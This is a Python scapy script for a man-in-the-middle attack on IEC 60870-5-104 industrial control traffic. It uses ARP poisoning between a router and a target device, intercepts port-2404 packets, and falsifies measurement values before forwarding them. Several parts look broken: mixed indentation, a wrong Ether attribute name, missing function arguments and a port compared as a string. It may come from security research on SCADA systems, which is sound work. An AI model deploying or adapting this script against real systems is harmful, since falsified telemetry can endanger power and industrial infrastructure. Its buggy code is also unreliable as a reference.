#!/usr/bin/python3

"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
"""


from ARP_poisoning import *
from iec104lib import *

ip_router = ARP_poisoning.get_iprouter()
ip_target = ARP_poisoning.get_ipdest()
ip_attack = ARP_poisoning.get_ipsrc()
mac_router = ARP_poisoning.get_mac(ip_router)
mac_target = ARP_poisoning.get_mac(ip_target)

interface = "en0"


def reconstructing_packet(chosen_packet):
    payload = chosen_packet[TCP].payload
    if orb(payload[2]) == 0x00:
        asdu_id = int(orb(payload[6]))
        iec_bind_layers(asdu_id)
        chosen_packet[TCP].decode_payload_as(i_frame)
    elif orb(payload[2]) == 0x01:
        chosen_packet[TCP].decode_payload_as(s_frame)
    else:
        chosen_packet[TCP].decode_payload_as(u_frame)


def modify_packet_for_target(chosen_packet):
    chosen_packet[Ether].src = chosen_packet[Ether].dest
    chosen_packet[Ether].dest = mac_target


def modify_packet_for_router(chosen_packet):
    chosen_packet[Ether].src = chosen_packet[Ether].dest
    chosen_packet[Ether].dest = mac_router


def modify_mesure_packet(chosen_packet):
	## TODO connect with DL and neural network solution
	value = 0
    chosen_packet[asdu_infobj_13].value = hex(value)

    # delete the checksum so that scapy will handle them and recalculate them
    del chosen_packet[IP].chksum
    del chosen_packet[TCP].chksum


def is_packet_containing_apci(packet):
    if packet.haslayer(u_frame) or packet.haslayer(s_frame) or packet.haslayer(i_frame):
        return True
    else:
        return False


def is_104_packet_from_router(packet):
    if is_packet_containing_apci() and (packet[IP].src == ip_router):
        return True
    else:
        return False


def is_104_packet_from_raspberry(packet):
    if is_packet_containing_apci() and (packet[IP].src == ip_target):
        return True
    else:
        return False


def is_packet_mesure_packet(packet):
    if is_packet_containing_apci(packet) and is_104_packet_from_raspberry(packet) and packet.haslayer(asdu_infobj_13):
        return True
    else:
        return False


def mitm(chosen_packet):
    if chosen_packet[Ether].src == mac_router and chosen_packet[IP].src == ip_router and chosen_packet[
        IP].dst == ip_target:
        modify_packet_for_target(chosen_packet)
        if chosen_packet[TCP].dport == '2404':
            new_packet = reconstructing_packet(chosen_packet)
            if is_packet_mesure_packet(chosen_packet):
                modify_mesure_packet(chosen_packet)

        send(chosen_packet, verbose=False)

    if chosen_packet[Ether].src == mac_target and chosen_packet[IP].src == ip_target and chosen_packet[
        IP].dst == ip_router:
        modify_packet_for_router(chosen_packet)
        send(chosen_packet, verbose=False)


def loop_sleep():
    while 1:
        try:
            time.sleep(1.5)
        except KeyboardInterrupt:
            break


def main_sniff():
    ARP_poisoning.stop_ip_forward()
    print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
    sniff(prn=mitm, filter="ip")

    ARP_poisoning().start_ip_forward()
    print("MitM with full forward until Keyboard Interruption")
    loop_sleep()
    print("")
    ARP_poisoning.stop_ip_forward()


if __name__ == "__main__":
    main_sniff()